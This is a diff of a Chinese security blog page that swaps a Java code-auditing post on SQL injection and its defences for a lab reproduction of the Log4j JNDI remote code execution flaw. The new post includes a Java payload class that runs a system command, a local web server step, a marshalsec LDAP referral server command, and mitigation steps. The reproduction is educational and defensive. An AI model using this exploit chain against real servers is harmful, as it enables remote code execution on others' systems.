@@ -2,16 +2,16 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>java代码审计-注解 | 六月的雨</title>
+  <title>java代码审计-Apache-Log4j | 六月的雨</title>
   <meta name="keywords" content=" Hexo , Markdown ">
-  <meta name="description" content="java代码审计-注解 | 六月的雨">
+  <meta name="description" content="java代码审计-Apache-Log4j | 六月的雨">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="description" content="Java反序列化CommonsCollections2分析版本要求：  DK版本：无要求 CommonsCollections 4.0(cc3.1中TransformingComparator没有继承自Serializable所以无法进行Java反序列化)  具备知识：  反射 动态代理 javassist ClassLoader#defineClass TemplatesImpl  添加依赖：">
+<meta name="description" content="Java反序列化CommonsCollections2分析分析前说几句学习心得，我个人感觉学习各种利用链， 第一，能够让你清晰了解到反序列化漏洞的原理、利用方式、漏洞危害怎么进行触发。 第二，认识哪些JAVA常见的可以被人利用并产生危害的类。 第三，POC的编写细节，再看别人的POC的时候，不是一味的照抄，而是每一句代码都要问自己，为什么要这么写，这样你才能够锻炼自己，如果没有POC的情况下，能够">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Java反序列化-CommonsCollections2分析">
 <meta property="og:url" content="http://example.com/2021/12/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CommonsCollections2%E5%88%86%E6%9E%90/index.html">
 <meta property="og:site_name" content="六月的雨">
-<meta property="og:description" content="Java反序列化CommonsCollections2分析版本要求：  DK版本：无要求 CommonsCollections 4.0(cc3.1中TransformingComparator没有继承自Serializable所以无法进行Java反序列化)  具备知识：  反射 动态代理 javassist ClassLoader#defineClass TemplatesImpl  添加依赖：">
+<meta property="og:description" content="Java反序列化CommonsCollections2分析分析前说几句学习心得，我个人感觉学习各种利用链， 第一，能够让你清晰了解到反序列化漏洞的原理、利用方式、漏洞危害怎么进行触发。 第二，认识哪些JAVA常见的可以被人利用并产生危害的类。 第三，POC的编写细节，再看别人的POC的时候，不是一味的照抄，而是每一句代码都要问自己，为什么要这么写，这样你才能够锻炼自己，如果没有POC的情况下，能够">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211209225905013.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211208142627069.png">
@@ -42,7 +42,7 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211208162850106.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211209224654292.png">
 <meta property="article:published_time" content="2021-12-06T14:00:12.000Z">
-<meta property="article:modified_time" content="2021-12-09T14:59:17.230Z">
+<meta property="article:modified_time" content="2021-12-13T09:51:21.886Z">
 <meta property="article:author" content="juneRain">
 <meta property="article:tag" content="Hexo">
 <meta property="article:tag" content="Markdown">
@@ -261,7 +261,7 @@
     <li>
         <div class="all active" data-rel="All">All
             
-                <small>(25)</small>
+                <small>(21)</small>
             
         </div>
     </li>
@@ -328,7 +328,7 @@
                     <div data-rel="JAVA代码审计">
                         
                         JAVA代码审计
-                        <small>(13)</small>
+                        <small>(9)</small>
                         
                     </div>
                     
@@ -342,7 +342,7 @@
                     <div data-rel="Java反序列化">
                         
                         Java反序列化
-                        <small>(3)</small>
+                        <small>(2)</small>
                         
                     </div>
                     
@@ -384,8 +384,8 @@
         
     </div>
 </div>
-<input type="hidden" id="yelog_site_posts_number" value="25">
-<input type="hidden" id="yelog_site_word_count" value="34.8k">
+<input type="hidden" id="yelog_site_posts_number" value="21">
+<input type="hidden" id="yelog_site_word_count" value="36.6k">
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
     <span id="busuanzi_value_site_pv"></span>
@@ -457,7 +457,7 @@
            href="/2021/12/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CommonsCollections3%E5%88%86%E6%9E%90/"
            data-tag="Hexo,Markdown"
            data-author="" >
-            <span class="post-title" title="Java反序列化-CommonsCollections3-5分析">Java反序列化-CommonsCollections3-5分析</span>
+            <span class="post-title" title="Java反序列化-CommonsCollections3-7分析">Java反序列化-CommonsCollections3-7分析</span>
             <span class="post-date" title="2021-12-06 22:00:12">2021/12/06</span>
         </a>
         
@@ -469,12 +469,12 @@
             <span class="post-date" title="2021-12-04 14:12:12">2021/12/04</span>
         </a>
         
-        <a  class="All Java反序列化 "
+        <a  class="All "
            href="/2021/12/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CommonsCollections1%E5%88%86%E6%9E%90/"
-           data-tag="Hexo,Markdown"
+           data-tag=""
            data-author="" >
-            <span class="post-title" title="Java反序列化-CommonsCollections1分析">Java反序列化-CommonsCollections1分析</span>
-            <span class="post-date" title="2021-12-01 15:38:12">2021/12/01</span>
+            <span class="post-title" title=""></span>
+            <span class="post-date" title="2021-12-01 15:37:18">2021/12/01</span>
         </a>
         
         <a  class="All 应用安全 "
@@ -550,26 +550,18 @@
         </a>
         
         <a  class="All JAVA代码审计 "
-           href="/2021/08/07/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-JDBC%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/"
-           data-tag="Hexo,Markdown"
-           data-author="" >
-            <span class="post-title" title="java代码审计-JDBC核心技术.">java代码审计-JDBC核心技术.</span>
-            <span class="post-date" title="2021-08-07 20:16:12">2021/08/07</span>
-        </a>
-        
-        <a  class="All JAVA代码审计 "
-           href="/2021/07/09/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-JAVA%E9%9B%86%E5%90%88/"
-           data-tag="Hexo,Markdown"
-           data-author="" >
-            <span class="post-title" title="java代码审计-集合">java代码审计-集合</span>
-            <span class="post-date" title="2021-07-09 20:20:22">2021/07/09</span>
-        </a>
-        
-        <a  class="All JAVA代码审计 "
            href="/2021/07/07/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-IDEA%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE/"
            data-tag="Hexo,Markdown"
            data-author="" >
             <span class="post-title" title="java代码审计-IDEA常用快捷键">java代码审计-IDEA常用快捷键</span>
+            <span class="post-date" title="2021-07-07 20:16:12">2021/07/07</span>
+        </a>
+        
+        <a  class="All java代码审计 "
+           href="/2021/07/07/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Apache-Log4j/"
+           data-tag="Hexo,Markdown"
+           data-author="" >
+            <span class="post-title" title="java代码审计-Apache-Log4j">java代码审计-Apache-Log4j</span>
             <span class="post-date" title="2021-07-07 20:16:12">2021/07/07</span>
         </a>
         
@@ -585,23 +577,7 @@
            href="/2021/07/07/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%8F%8D%E5%B0%84/"
            data-tag="Hexo,Markdown"
            data-author="" >
-            <span class="post-title" title="java代码审计-注解">java代码审计-注解</span>
-            <span class="post-date" title="2021-07-07 20:16:12">2021/07/07</span>
-        </a>
-        
-        <a  class="All JAVA代码审计 "
-           href="/2021/07/07/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/"
-           data-tag="Hexo,Markdown"
-           data-author="" >
-            <span class="post-title" title="java代码审计-注解">java代码审计-注解</span>
-            <span class="post-date" title="2021-07-07 20:16:12">2021/07/07</span>
-        </a>
-        
-        <a  class="All java代码审计 "
-           href="/2021/07/07/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8-APP%E6%B5%8B%E8%AF%95%20-%20%E5%89%AF%E6%9C%AC/"
-           data-tag="Hexo,Markdown"
-           data-author="" >
-            <span class="post-title" title="java代码审计-Apache-Log4j">java代码审计-Apache-Log4j</span>
+            <span class="post-title" title="java代码审计-编程语法">java代码审计-编程语法</span>
             <span class="post-date" title="2021-07-07 20:16:12">2021/07/07</span>
         </a>
         
@@ -637,14 +613,6 @@
             <span class="post-date" title="2021-06-28 15:16:12">2021/06/28</span>
         </a>
         
-        <a  class="All JAVA代码审计 "
-           href="/2021/06/26/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%B8%B8%E7%94%A8%E7%B1%BB%E6%97%A5%E6%9C%9F%E6%97%B6%E9%97%B4API/"
-           data-tag="Hexo,Markdown"
-           data-author="" >
-            <span class="post-title" title="java代码审计-常用类日期时间API">java代码审计-常用类日期时间API</span>
-            <span class="post-date" title="2021-06-26 15:16:12">2021/06/26</span>
-        </a>
-        
         <div id="no-item-tips">
 
         </div>
@@ -663,9 +631,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-java代码审计-思路总结" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-java代码审计-Apache-Log4j" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">java代码审计-注解</h1>
+        <h1 class="article-title">java代码审计-Apache-Log4j</h1>
     
     <div class="article-meta">
         
@@ -675,7 +643,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="JAVA代码审计">JAVA代码审计</a>
+            <a  data-rel="java代码审计">java代码审计</a>
             
         </span>
         
@@ -692,12 +660,12 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2021-12-09 17:22:04'>2021-07-07 20:16</time>
+            Created At : <time class="date" title='Updated At: 2021-12-12 22:55:35'>2021-07-07 20:16</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:854</span>
+        <span>Count:437</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -727,7 +695,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-text">0x01 SQL注入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95"><span class="toc-text">挖掘方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95"><span class="toc-text">防御方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ORDER-BY"><span class="toc-text">ORDER BY</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E7%9F%A5%E8%AF%86%E7%AF%87"><span class="toc-text">其他知识篇</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-text">任意文件读取</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Apache-Log4j"><span class="toc-text">Apache-Log4j</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%BA%BF%E6%AD%A5%E9%AA%A4"><span class="toc-text">复线步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E8%AF%91exp-%E4%BF%AE%E6%94%B9Log4jRCE-java"><span class="toc-text">编译exp-修改Log4jRCE.java</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#python%E8%B5%B7%E4%B8%AA%E6%9C%AC%E5%9C%B0%E7%AE%80%E6%98%93web%E6%9C%8D%E5%8A%A1"><span class="toc-text">python起个本地简易web服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8%E6%9C%AC%E5%9C%B0%E8%B5%B7%E4%B8%80%E4%B8%AAldap%E6%9C%8D%E5%8A%A1"><span class="toc-text">在本地起一个ldap服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%90%E8%A1%8Clog4j-java%E7%A8%8B%E5%BA%8F"><span class="toc-text">运行log4j.java程序</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%B4%E6%97%B6%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A"><span class="toc-text">临时修复方案：</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -743,60 +711,42 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>常见框架</p>
-<p>Hibernate  </p>
-<p>​        它将POJO与数据库表建立映射关系，是一个全自动的ORM框架，hibernate可以自动生成SQL语句，自动执行</p>
-<p>MyBatis</p>
-<p>​        MyBatis 可以使用简单的 XML 或注解来配置和映射原生类型、接口和 Java 的 POJO（Plain Old Java Objects，普通老式 Java 对象）为数据库中的记录</p>
-<h2 id="0x01-SQL注入漏洞"><a href="#0x01-SQL注入漏洞" class="headerlink" title="0x01 SQL注入漏洞"></a>0x01 SQL注入漏洞</h2><p>​    </p>
-<h3 id="挖掘方法"><a href="#挖掘方法" class="headerlink" title="挖掘方法"></a>挖掘方法</h3><p>使用idea 搜索$关键字</p>
-<p>可以先筛选xml文件搜索$,逐个分析，要特别注意mybatis-generator的order by注入</p>
-<p>Ctrl+shift+F 调出Find in Path，筛选后缀xml，搜索$关键字</p>
-<p>找到是mybatis的数据库文件</p>
-<p>找到调用函数后，alt+f7查看调用链，检查中间是否被过滤</p>
-<h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><p>1、添加全局过滤器，过滤特殊字符</p>
-<p>1.使用JDBC底层的sql注入预编译</p>
-<p>2.sql注入预编译也不是百分百能过滤sql注入。第一order by后不能使用预编译，因为预编译使用占位符? ，然后生成sql语句，会使用单引号将？的语句括起来，但是order by 后面加单引号会使得sql语句失效，所以需要单独使用白名单，将数据库的字段，表，库，放到一个集合中，使用白名单进行过滤。第二，使用了${},正确使用是#{}。</p>
-<p>2.容易忽视的点 HTTP头部参数</p>
-<p>3.使用工具包common-lang中工具类StringEscapeUtils，过滤的方法是在单引号后面再加一个单引号。但是如果不需要使用单引号就能注入的点，就不能使用StringEscapeUtils</p>
-<h3 id="ORDER-BY"><a href="#ORDER-BY" class="headerlink" title="ORDER BY"></a>ORDER BY</h3><p>我们已经知道，通过占位符传参，不管传递的是什么类型的值，都会被单引号包裹。而使用 <code>ORDER BY</code> 时，要求传入的是字段名或者是字段位置，如：</p>
-<ol>
-<li><code>SELECT * FROM user ORDER BY id</code></li>
-<li><code>SELECT * FROM user ORDER BY 1</code></li>
-</ol>
-<p><strong>如果传入的是引号包裹的字符串，那么 <code>ORDER BY</code> 会失效</strong>，如：<code>SELECT * FROM user ORDER BY &#39;id&#39;</code>。</p>
-<p>所以，如果要动态传入 <code>ORDER BY</code> 参数，只能用字符串拼接的方式，如：</p>
-<pre><code>String sql = &quot;SELECT * FROM user ORDER BY &quot; + column;
-</code></pre>
-<p>那么这样依然可能会存在SQL注入的问题，在 <code>Java</code> 中会有两种情况：</p>
-<ol>
-<li><p>column 是字符串型</p>
-<p>这种情况和 <code>Statement</code> 中描述的一样，是存在注入的。要防御就必须要手动过滤，或者将字段名硬编码到 <code>SQL</code> 语句中，比如：</p>
-<pre><code>String column = &quot;id&quot;;
-String sql =&quot;&quot;;
-switch(column)&#123;
-    case &quot;id&quot;:
-        sql = &quot;SELECT * FROM user ORDER BY id&quot;;
-        break;
-    case &quot;username&quot;:
-        sql = &quot;SELECT * FROM user ORDER BY username&quot;;
-        break;
-    ......
-&#125;
-</code></pre>
-</li>
-<li><p>column 是 int 型</p>
-<p>因为 <code>Java</code> 是强类型语言，当用户传递的参数与后台定义的参数类型不匹配，程序会抛出异常，赋值失败。所以，不会存在注入的问题。</p>
-</li>
-</ol>
+        <h1 id="Apache-Log4j"><a href="#Apache-Log4j" class="headerlink" title="Apache-Log4j"></a>Apache-Log4j</h1><p><a target="_blank" rel="noopener" href="https://github.com/askDing/apache-log4j-poc">Apache Log4j 远程代码执行</a></p>
 <blockquote>
-<p>类似的， <code>GROUP BY</code> 也会有同样的问题。</p>
+<p>攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响</p>
 </blockquote>
-<h1 id="其他知识篇"><a href="#其他知识篇" class="headerlink" title="其他知识篇"></a>其他知识篇</h1><p>Java三大器</p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/20161029082959934" alt="img"></p>
-<p>自定义拦截器的步骤  </p>
-<p>第一步：自定义一个实现了Interceptor接口的类，或者继承抽象类AbstractInterceptor。<br>  第二步：在配置文件中注册定义的拦截器。<br>  第三步：在需要使用Action中引用上述定义的拦截器，为了方便也可以将拦截器定义为默认的拦截器，这样在不加特殊说明的情况下，所有的</p>
-<h2 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h2><p>查找path或者model.path</p>
+<p><img src="https://user-images.githubusercontent.com/45926593/145425339-47c71230-87d2-4519-8919-9c3520850f83.png" alt="image"></p>
+<p>image</p>
+<h2 id="复线步骤"><a href="#复线步骤" class="headerlink" title="复线步骤"></a>复线步骤</h2><h3 id="编译exp-修改Log4jRCE-java"><a href="#编译exp-修改Log4jRCE-java" class="headerlink" title="编译exp-修改Log4jRCE.java"></a>编译exp-修改Log4jRCE.java</h3><pre><code>public class Log4jRCE &#123;
+    static&#123;
+        try&#123;
+            String[] cmd=&#123;&quot;open&quot;,&quot;/System/Applications/Calculator.app&quot;&#125;;
+            java.lang.Runtime.getRuntime().exec(cmd).waitFor();
+        &#125;catch (Exception e)&#123;
+            e.printStackTrace();
+        &#125;
+    &#125;
+&#125;java复制代码
+</code></pre>
+<h3 id="python起个本地简易web服务"><a href="#python起个本地简易web服务" class="headerlink" title="python起个本地简易web服务"></a>python起个本地简易web服务</h3><p>在target/classes目录下执行 <code>python3 -m http.server 8888</code></p>
+<p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211210134009.png" alt="img"></p>
+<h3 id="在本地起一个ldap服务"><a href="#在本地起一个ldap服务" class="headerlink" title="在本地起一个ldap服务"></a>在本地起一个ldap服务</h3><pre><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://127.0.0.1:8888/#Log4jRCE&quot;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211210141034.png" alt="img"></p>
+<h3 id="运行log4j-java程序"><a href="#运行log4j-java程序" class="headerlink" title="运行log4j.java程序"></a>运行log4j.java程序</h3><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211210134659.png" alt="img"></p>
+<h2 id="临时修复方案："><a href="#临时修复方案：" class="headerlink" title="临时修复方案："></a>临时修复方案：</h2><p>（1）修改jvm参数<br>-Dlog4j2.formatMsgNoLookups=true</p>
+<p>（2）修改配置<br>在应用classpath下添加log4j2.component.properties配置文件，log4j2.formatMsgNoLookups=true</p>
+<p>①在jvm启动参数中添加</p>
+<pre><code>-Dlog4j2.formatMsgNoLookups=true
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211210151940.png" alt="img"></p>
+<p>②系统环境变量中配置</p>
+<pre><code>FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS=true
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211210152021.png" alt="img"></p>
+<p>③项⽬中创建log4j2.component.properties⽂件，⽂件中增加配置<code>log4j2.formatMsgNoLookups=true</code></p>
+<p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211210152139.png" alt="img"></p>
+<p>Log4j2 漏洞修复建议<br>临时性缓解措施（任选一种，但是注意，只有 &gt;=2.1.0 版本才可以用，老版本不支持这个选项）<br>在 jvm 参数中添加 -Dlog4j2.formatMsgNoLookups=true<br>系统环境变量中将FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 设置为 true<br>创建 log4j2.component.properties 文件，文件中增加配置 log4j2.formatMsgNoLookups=true<br>彻底修复漏洞:<br>方案一、研发代码修复：升级到官方提供的 log4j-2.15.0-rc2 版本<br>方案二、生产环境修复：<a target="_blank" rel="noopener" href="https://github.com/zhangyoufu/log4j2-without-jndi%E3%80%82%EF%BC%88%E5%A6%82%E6%9E%9C%E4%B8%8D%E6%94%BE%E5%BF%83%E7%BD%91%E4%B8%8A%E4%B8%8B%E8%BD%BD%E7%9A%84%E7%89%88%E6%9C%AC%EF%BC%8C%E4%B9%9F%E5%8F%AF%E4%BB%A5%E8%87%AA%E5%B7%B1%E6%89%8B%E5%8A%A8%E8%A7%A3%E5%8E%8B%E5%88%A0%E9%99%A4%EF%BC%9Azip">https://github.com/zhangyoufu/log4j2-without-jndi。（如果不放心网上下载的版本，也可以自己手动解压删除：zip</a> -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class 删除jar包里的这个漏洞相关的class，然后重启服务即可）</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 2017441810@qq.com </span>
@@ -810,12 +760,12 @@ switch(column)&#123;
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">Title:</span>java代码审计-注解</p>
-    <p><span class="copy-title">Count:</span><span class="post-count">854</span></p>
+    <p><span class="copy-title">Title:</span>java代码审计-Apache-Log4j</p>
+    <p><span class="copy-title">Count:</span><span class="post-count">437</span></p>
     <p><span class="copy-title">Author:</span><a  title="juneRain">juneRain</a></p>
     <p><span class="copy-title">Created At:</span>2021-07-07, 20:16:12</p>
-    <p><span class="copy-title">Updated At:</span>2021-12-09, 17:22:04</p>
-    <span class="copy-title">Url:</span><a class="post-url" href="/2021/07/07/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/" title="java代码审计-注解">http://example.com/2021/07/07/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/</a>
+    <p><span class="copy-title">Updated At:</span>2021-12-12, 22:55:35</p>
+    <span class="copy-title">Url:</span><a class="post-url" href="/2021/07/07/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Apache-Log4j/" title="java代码审计-Apache-Log4j">http://example.com/2021/07/07/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Apache-Log4j/</a>
     <p>
         <span class="copy-title">Copyright:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">&#39;Attribution-non-commercial-shared in the same way 4.0&#39;</a> Reprint please keep the original link and author.
     </p>
